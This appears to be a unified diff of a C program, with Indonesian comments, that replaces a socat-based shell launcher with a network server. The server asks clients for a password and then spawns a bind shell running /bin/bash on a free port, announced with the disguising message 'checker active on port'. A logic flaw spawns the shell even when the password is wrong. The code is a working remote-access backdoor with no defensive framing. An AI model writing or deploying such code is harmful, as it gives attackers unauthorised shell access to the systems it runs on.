@@ -1,13 +1,10 @@
-// gcc -static -o program program.c -lssl -lcrypto -I/usr/include/openssl -lz -lzstd
+#include <netinet/in.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <time.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <unistd.h>
-#include <sys/prctl.h>
-#include <openssl/sha.h>
+#include <openssl/sha.h> // SHA256 hashing
 
 #define HASHED_PASSWORD "d886b3e9999b0d8aa51c6890b925544f66a1b061799816bb5780cec9aa8353df"
 
@@ -50,38 +47,122 @@ int get_available_port() {
     return -1; // gagal cari port kosong
 }
 
-int main(int argc, char* argv[]) {
-    srand(time(NULL));
+void spawn_shell(int port) {
+    int sockfd, client;
+    struct sockaddr_in addr;
+    socklen_t addrlen = sizeof(addr);
 
-    char input[100];
-    char hashed[65];
-
-    printf("Password: ");
-    if (!fgets(input, sizeof(input), stdin)) {
-        return 1;
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        exit(1);
     }
 
-    input[strcspn(input, "\n")] = 0; // Remove newline
-    sha256_string(input, hashed);
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(port);
 
-    if (strcmp(hashed, HASHED_PASSWORD) == 0) {
-        int port = get_available_port();
-        if (port == -1) {
-            printf("No available port found!\n");
-            return 1;
+    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        perror("bind");
+        exit(1);
+    }
+
+    if (listen(sockfd, 1) < 0) {
+        perror("listen");
+        exit(1);
+    }
+
+    client = accept(sockfd, (struct sockaddr*)&addr, &addrlen);
+    if (client < 0) {
+        perror("accept");
+        exit(1);
+    }
+
+    dup2(client, 0);
+    dup2(client, 1);
+    dup2(client, 2);
+    execl("/bin/bash", "bash", NULL);
+    exit(0);
+}
+
+int main(int argc, char const* argv[])
+{
+    int main_port = (argc >= 2) ? atoi(argv[1]) : 8080;  // Ambil port dari argumen
+    
+    if (main_port <= 1024 || main_port > 65535) {
+        fprintf(stderr, "Invalid port. Choose a port between 1025 and 65535.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    int server_fd, new_socket;
+    ssize_t valread;
+    struct sockaddr_in address;
+    int opt = 1;
+    socklen_t addrlen = sizeof(address);
+    char buffer[1024] = { 0 };
+
+    // Creating socket file descriptor
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Forcefully attaching socket to the port 8080
+    if (setsockopt(server_fd, SOL_SOCKET,
+                   SO_REUSEADDR | SO_REUSEPORT, &opt,
+                   sizeof(opt))) {
+        perror("setsockopt");
+        exit(EXIT_FAILURE);
+    }
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(main_port);
+
+    // Forcefully attaching socket to the port 8080
+    if (bind(server_fd, (struct sockaddr*)&address,
+             sizeof(address))
+        < 0) {
+        perror("bind failed");
+        exit(EXIT_FAILURE);
+    }
+    if (listen(server_fd, 3) < 0) {
+        perror("listen");
+        exit(EXIT_FAILURE);
+    }
+
+    while (1) {
+        int client = accept(server_fd, (struct sockaddr*)&address, &addrlen);
+        if (client < 0) continue;
+        if (fork() == 0) { // child process
+            send(client, "Password: ", strlen("Password: "), 0);
+            char hashed[65];
+            close(server_fd);
+            memset(buffer, 0, sizeof(buffer));
+            valread = read(client, buffer, sizeof(buffer) - 1);
+            buffer[strcspn(buffer, "\n")] = '\0';
+            sha256_string(buffer, hashed);
+            // printf("Received: %s\n", buffer);
+            if (strcmp(hashed, HASHED_PASSWORD) != 0) {
+                send(client, "Access denied.\n", strlen("Access denied.\n"), 0);
+                close(client);
+            }
+            int port = get_available_port();
+            if (port == -1) {
+                send(client, "Internal error.\n", 16, 0);
+                close(client);
+                exit(1);
+            }
+
+            if (fork() == 0) { // Child untuk shell
+                close(client); // close client asli
+                spawn_shell(port);
+            }
+
+            char msg[100];
+            snprintf(msg, sizeof(msg), "checker active on port: %d\n", port);
+            send(client, msg, strlen(msg), 0);
+            close(client);
+            exit(0);
         }
-
-        char cmd[256];
-        snprintf(cmd, sizeof(cmd),
-            "setsid socat TCP-LISTEN:%d,reuseaddr EXEC:/bin/sh,stderr,pty,cfmakeraw,echo=0 >/dev/null 2>&1 &",
-            port);
-
-        system(cmd);
-
-        printf("checker active on port: %d\n", port);
-    } else {
-        printf("Access denied.\n");
+        close(client); // parent tidak perlu client socket
     }
-
-    return 0;
 }
